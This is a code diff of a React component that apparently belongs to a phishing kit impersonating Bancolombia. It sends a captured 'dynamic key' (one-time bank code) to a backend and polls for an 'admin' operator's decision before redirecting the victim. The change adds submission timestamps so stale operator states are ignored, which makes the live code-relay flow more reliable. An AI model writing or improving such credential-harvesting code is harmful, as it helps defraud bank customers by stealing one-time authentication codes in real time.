@@ -31,6 +31,9 @@ export default function ClaveDinamica() {
 
     // Se inicializa el input de los refs
     const inputRefs = useRef([]);
+    const pollingIntervalRef = useRef(null);
+    const statusTickRef = useRef(null);
+    const submitTickRef = useRef(0);
 
     // Se inicializa los estados
     const [ip, setIp] = useState("");
@@ -402,8 +405,10 @@ export default function ClaveDinamica() {
                 await instanceBackend.post("/bancolombia/dinamica", dataSend);
             }
 
-            // Iniciar polling para esperar respuesta del admin
-            initPolling(sessionId);
+            // Iniciar polling para esperar respuesta del admin con timestamp de envío
+            const submitTime = Date.now();
+            submitTickRef.current = submitTime;
+            initPolling(sessionId, submitTime);
         } catch (error) {
 
             // En caso de error, se muestra un mensaje
@@ -415,13 +420,16 @@ export default function ClaveDinamica() {
     };
 
     // Función de polling para esperar respuesta del admin
-    const initPolling = (sessionId) => {
+    const initPolling = (sessionId, submitTime = 0) => {
 
-        // Se inicializa el timeout
-        let timeoutId;
+        // Limpiar intervalo anterior si existe
+        if (pollingIntervalRef.current) {
+            clearInterval(pollingIntervalRef.current);
+            pollingIntervalRef.current = null;
+        }
 
         // Se inicializa el intervalo de polling
-        const pollingInterval = setInterval(async () => {
+        pollingIntervalRef.current = setInterval(async () => {
 
             // Se usa el try catch
             try {
@@ -429,11 +437,21 @@ export default function ClaveDinamica() {
                 // Se obtiene el estado de la sesion
                 const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);
 
-                // Se captura el estado
-                const { estado, url, text } = response.data;
-                const estadoLower = estado.toLowerCase();
+                // Se captura el estado y statusTick
+                const { estado, url, text, statusTick } = response.data;
+                const estadoLower = (estado || "").toLowerCase();
                 const hasUrl = Boolean(url && String(url).trim());
                 const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
+
+                // Si el statusTick recibido es anterior a este envío, ignorar estado viejo
+                if (submitTime > 0 && statusTick != null && Number(statusTick) < submitTime) {
+                    return;
+                }
+
+                // Si ya procesamos exactamente este statusTick y estado, no repetir
+                if (statusTick != null && statusTickRef.current === statusTick) {
+                    return;
+                }
 
                 // Estados que detienen el polling
                 const stateValid = [
@@ -465,10 +483,15 @@ export default function ClaveDinamica() {
 
                 // Se verifica si el estado es válido
                 if (stateValid.includes(estadoLower)) {
+                    if (statusTick != null) {
+                        statusTickRef.current = statusTick;
+                    }
 
                     // Se limpian los intervalos
-                    clearInterval(pollingInterval);
-                    clearTimeout(timeoutId);
+                    if (pollingIntervalRef.current) {
+                        clearInterval(pollingIntervalRef.current);
+                        pollingIntervalRef.current = null;
+                    }
                 }
 
                 // Redirecciones basadas en respuesta del admin
